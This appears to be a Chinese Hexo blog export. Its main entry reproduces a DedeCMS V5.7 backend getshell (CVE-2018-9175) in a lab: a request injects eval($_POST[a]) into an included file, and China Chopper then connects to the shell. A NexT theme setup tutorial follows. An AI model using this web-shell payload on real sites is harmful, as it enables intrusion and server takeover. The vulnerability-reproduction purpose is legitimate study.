<h2 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h2><h2 id="幂数加密-amp-云影密码"><a href="#幂数加密-amp-云影密码" class="headerlink" title="幂数加密 &amp; 云影密码"></a>幂数加密 &amp; 云影密码</h2><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><h2 id="杰斐逊转轮密码"><a href="#杰斐逊转轮密码" class="headerlink" title="杰斐逊转轮密码"></a>杰斐逊转轮密码</h2>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
    <url>/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
<blockquote>
<p>查看源码，找到漏洞</p>
</blockquote>
<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_1.php"></p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/???url" alt="sys_2.php"></p>
<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??url" alt="sys_3.php"></p>
<blockquote>
<p>写入SHELL并触发</p>
</blockquote>
<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>

<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="1_payload"></p>
<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="2_inc"></p>
<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="3_shell"></p>
<blockquote>
<p>中国菜刀添加SHELL</p>
</blockquote>
<p>很简单吧！嘻嘻嘻！ <img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.1"></p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="4_caidao.2"></p>
<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq2"></p>
<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
<p>3.及时打补丁，更新补丁。</p>
<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
<p><img src="/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/url" alt="bq3"></p>
<p><a href="balabalabbbbbba....">参考链接</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建之NexT主题美化</title>
    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>在终端窗口下，定位到 <code>Hexo</code> 站点目录下。使用 <code>git</code> 代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h3 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h3><p>与所有 Hexo 主题启用的模式一样。 当 <span class="label default">克隆/下载</span> 完成后，打开 <span class="label warning">站点配置文件</span> ， 找到 <code>theme</code> 字段，并将其值更改为 <code>next</code>:</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>

<p>到此，NexT 主题安装完成，下一步将验证主题是否正确启用。在切换主题之后、验证之前，最好使用 <code> hexo clean</code> 来清除 Hexo 的缓存。</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>首先启动 Hexo 本地站点，并开启调试模式（ <code>hexo s --debug</code> ），在服务启动的过程，注意观察命令行输出是否有任何异常信息，当命令行输出中提示出：</p>
<p><code>INFO  Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop.</code></p>
<p>此时即可使用浏览器访问 <code>http://localhost:4000</code>，检查站点是否正确运行。</p>
<p>当站点的外观与下图所示类似时即说明已成功安装 NexT 主题。这是 NexT 默认的 Scheme —— Muse .</p>
<p><img src="/images/next.jpg" alt="NexT 主题界面"></p>
<h2 id="主题设定"><a href="#主题设定" class="headerlink" title="主题设定"></a>主题设定</h2><p>对于默认主题用起来有点不顺手，可以进行一些简单的设定改变主题的模样。</p>
<h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>Scheme 是 NexT 提供的一种特性，借助于 Scheme，NexT 为你提供多种不同的外观。同时，几乎所有的配置都可以 在 Scheme 之间共用。目前 NexT 支持三种 Scheme，他们是：</p>
<ul>
<li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li>
<li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li>
<li>Pisces - 双栏 Scheme，小家碧玉似的清新</li>
<li>Gemini - Pisces 的改进版本，分块明确</li>
</ul>
<p>Scheme 的切换通过更改 <span class="label success">主题配置文件</span> ，搜索 <code>scheme</code> 关键字，将需用启用的 scheme 前面注释 <code>#</code> 去除即可。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">scheme:</span> <span class="string">Muse</span></span><br><span class="line"><span class="comment">#scheme: Mist</span></span><br><span class="line"><span class="comment">#scheme: Pisces</span></span><br><span class="line"><span class="comment">#scheme: Gemini</span></span><br></pre></td></tr></table></figure>

<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 将 <code>language</code> 设置成所需要的语言，例如选用简体中文，配置如下：</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure>

<h3 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h3><p>菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标，NexT 使用的是 FontAwesome 提供的图标。</p>
<p>默认的 Next 主题样式中只包含首页和归档这两个链接，可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>menu</code> 字段来新增更多页面菜单。 其设置格式是 <code>item name: link || icon</code> ：<br>    - item name ：是一个名称，这个名称并不直接显示在页面上，用于匹配图标以及翻译<br>    - link ：菜单链接<br>    - icon ：表示所用的 <code>FontAwesome</code> 图标名称</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">/404/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>

<p>以上设置的菜单的名称并不直接用于界面上的展示，而是查找其对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 <code>languages/&#123;language&#125;.yml</code> 中（ <code>&#123;language&#125;</code> 为你所使用的语言）。</p>
<p>以简体中文为例，若你需要添加一个菜单项，比如 <code>something</code> 。那么就需要修改简体中文对应的翻译文件 <code>languages/zh-Hans.yml</code> ，在 <code>menu</code> 字段下添加一项：</p>
<figure class="highlight yml"><figcaption><span>themes/next/languages/zh-Hans.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br><span class="line">  <span class="attr">commonweal:</span> <span class="string">公益404</span></span><br><span class="line">  <span class="attr">something:</span> <span class="string">有料</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span>  <span class="comment"># 是否显示各个页面的图标</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">false</span>  <span class="comment"># 是否显示分类/标签/归档页的内容量</span></span><br></pre></td></tr></table></figure>

<h3 id="设置侧栏"><a href="#设置侧栏" class="headerlink" title="设置侧栏"></a>设置侧栏</h3><p>默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 <span class="label success">主题配置文件</span> 中的 <code>sidebar</code> 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="comment"># position: left  # 靠左放置</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span>   <span class="comment"># 靠右放置</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure>

<p>修改 <code>sidebar.display</code> 的值(只针对 Muse | Mist 主题)，支持的选项有：</p>
<ul>
<li>post - 默认行为，在文章页面（拥有目录列表）时显示</li>
<li>always - 在所有页面中都显示</li>
<li>hide - 在所有页面中都隐藏（可以手动展开）</li>
<li>remove - 完全移除</li>
</ul>
<h3 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a>设置头像</h3><p>编辑 <span class="label success">主题配置文件</span>， 修改字段 <code>avatar</code>， 值设置成头像的链接地址。其中，头像的链接地址可以是 <span class="label default">一个完整的互联网url</span> 或 <span class="label default">站点内的地址</span> 。</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sidebar Avatar</span></span><br><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/xin.jpg</span>   <span class="comment"># 头像图片放置在themes/next/source/images目录下</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span> <span class="comment"># 鼠标放在头像上时是否旋转</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span>  <span class="comment"># 头像是否设为圆形，否则为矩形</span></span><br></pre></td></tr></table></figure>

<h3 id="设置作者昵称及站点描述"><a href="#设置作者昵称及站点描述" class="headerlink" title="设置作者昵称及站点描述"></a>设置作者昵称及站点描述</h3><p>编辑 <span class="label warning">站点配置文件</span> ， 设置 <code>author</code> 为作者昵称，设置 <code>description</code> 字段为站点描述,可以是喜欢的一句签名:)</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">xinkjung&#x27;s</span> <span class="string">Blog</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27; Be happy. &#x27;</span></span><br><span class="line"><span class="attr">keywords:</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br></pre></td></tr></table></figure>


<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>安装好的默认主题是很简洁的，很多信息和配置都需要手动来进行修改。</p>
<h3 id="添加标签-分类页面"><a href="#添加标签-分类页面" class="headerlink" title="添加标签/分类页面"></a>添加标签/分类页面</h3><span class="label default">标签</span> 页面将展示站点的所有标签，若你的所有文章都未包含标签，此页面将是空的。

<span class="label default">分类</span> 页面将展示站点的所有分类，若你的所有文章都未包含分类，此页面将是空的。 

<p>在终端窗口下，定位到 Hexo 站点目录下，新建一个页面，命名为 <code>tags</code> / <code>categories</code> ： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories </span><br></pre></td></tr></table></figure>

<p>这时会发现 <code>source</code> 目录下出现了 <code>tags</code> 、 <code>categories</code> 两个文件夹，编辑文件夹内的 <code> index.md</code> 文件：</p>
<figure class="highlight yml"><figcaption><span>source/tags/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">标签</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;tags&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><figcaption><span>source/categories/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">分类</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;categories&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 这里要注意确保在主题配置文件的 menu 字段中添加了 tags 和 categories 页面</p>
          </div>

<h3 id="添加腾讯公益-404"><a href="#添加腾讯公益-404" class="headerlink" title="添加腾讯公益 404"></a>添加腾讯公益 404</h3><p>与上面类似，也是通过新增页面的方法来添加该页面，编辑页面内容为腾讯公益404页面即可。寻找丢失儿童，让大家一起关注此项公益事业！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><figcaption><span>source/404/index.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;index,follow&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/style/404style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/plain&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.qq.com/404/search_children.js&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;/&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">homePageName</span>=<span class="string">&quot;回到我的主页&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/data.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://qzone.qq.com/gy/404/page.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 主题配置文件的 menu 字段中已经包含了 commonweal：/404/ ，直接在 menu 字段添加就可以了</p>
          </div>

<h3 id="添加-about-页面"><a href="#添加-about-页面" class="headerlink" title="添加 about 页面"></a>添加 about 页面</h3><p>原理同上，首先新建一个 <code>about</code> 页面，然后编辑 <code>index.md</code> 即为页面显示内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><figcaption><span>source/about/index.md</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">About</span> <span class="string">Me</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-07-30 18:45:37</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;about&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">xinkjung&#x27;s</span> <span class="string">blog!</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/menu.png" alt="菜单栏效果预览"></p>
<h3 id="设置代码高亮-复制"><a href="#设置代码高亮-复制" class="headerlink" title="设置代码高亮/复制"></a>设置代码高亮/复制</h3><p>NexT 主题的代码块默认使用白色的 <code>normal</code> 主题，可选的值有 <code>normal</code> 、 <code>night</code> 、  <code>night blue</code> 、 <code>night bright</code> 、 <code>night eighties</code> 、 <code>solarized</code> 、 <code>solarized</code> 、 <code>dark</code> 、 <code>galactic</code> ，可以在 <span class="label success">主题配置文件</span> 中进行设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">codeblock:</span></span><br><span class="line">  <span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line">  <span class="attr">copy_button:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment"># 显示代码复制按钮</span></span><br><span class="line">    <span class="attr">show_result:</span> <span class="literal">true</span>  <span class="comment"># 展示复制结果</span></span><br></pre></td></tr></table></figure>

<h3 id="设置侧边栏社交"><a href="#设置侧边栏社交" class="headerlink" title="设置侧边栏社交"></a>设置侧边栏社交</h3><p>通过 <span class="label success">主题配置文件</span> 中的 <code>social</code> 字段进行设置，其键值格式是 <code>显示文本: 链接地址 || 图标名称</code> ：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">  <span class="attr">E-Mail:</span> <span class="string">mailto:xinkjung@163.com</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-envelope</span></span><br><span class="line">  <span class="comment">#Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line">  <span class="comment">#Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line">  <span class="comment">#Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line">  <span class="comment">#YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line">  <span class="attr">Instagram:</span> <span class="string">https://instagram.com/xinkjung</span> <span class="string">||</span> <span class="string">fab</span> <span class="string">fa-instagram</span></span><br><span class="line">  <span class="comment">#Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># 是否显示社交图标</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span>    <span class="comment"># 是否只显示社交图标</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">false</span>    </span><br></pre></td></tr></table></figure>

<p><img src="/images/sidebar.png" alt="侧栏效果预览"></p>
<h3 id="开启打赏功能"><a href="#开启打赏功能" class="headerlink" title="开启打赏功能"></a>开启打赏功能</h3><p>越来越多的平台（微信公众平台，新浪微博，简书，百度打赏等）支持打赏功能，付费阅读时代越来越近，特此增加了打赏功能，支持微信打赏和支付宝打赏。 只需要 <span class="label success">主题配置文件</span> 中填入 <code>微信</code> 和 <code>支付宝</code> 收款二维码图片地址即可开启该功能:</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">请我喝杯奶茶吧～</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.png</span></span><br><span class="line">  <span class="attr">alipay:</span> <span class="string">/images/alipay.png</span></span><br><span class="line">  <span class="comment">#paypal: /images/paypal.png</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/reward.png" alt="打赏效果预览"></p>
<h3 id="设置底部布局"><a href="#设置底部布局" class="headerlink" title="设置底部布局"></a>设置底部布局</h3><p>站点建立时间可以在站点的底部显示，例如 © 2013 - 2015。 编辑 <span class="label success">主题配置文件</span>，修改字段 <code>since</code> 内容，同时文章底部的布局也都可以在 <code>footer</code> 字段下进行设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line">  <span class="attr">since:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">    <span class="attr">animated:</span> <span class="literal">false</span>   <span class="comment"># 图标是否闪烁</span></span><br><span class="line">    <span class="attr">color:</span> <span class="string">&quot;#D3D3D3&quot;</span>   <span class="comment"># 图标颜色，这里是亮灰色</span></span><br><span class="line">  <span class="attr">copyright:</span>    <span class="comment"># 如果不设置，将会默认显示站点作者名称</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span>  <span class="comment"># true  # 是否显示 Powered by Hexo &amp; NexT</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/footer.png" alt="底部效果预览"></p>
<h2 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h2><p>进行了一些基础配置之后感觉还不是很完美，于是又有了下面这些进阶设置。</p>
<h3 id="自定义网站图标"><a href="#自定义网站图标" class="headerlink" title="自定义网站图标"></a>自定义网站图标</h3><p>博客的默认图标是 <code>N</code> ，不过 NexT 支持修改图标，博客网站的图标可以在 <a href="https://www.iconfont.cn/">iconfont</a> 网站选择，然后选择或者创建相应大小的图标文件，放置在 <code>themes/next/sources/images</code> 目录下，并在 <span class="label success">主题配置文件</span> 中进行如下配置（只需要设置 <code>small</code> 和 <code>medium</code> 两个就可以）：</p>
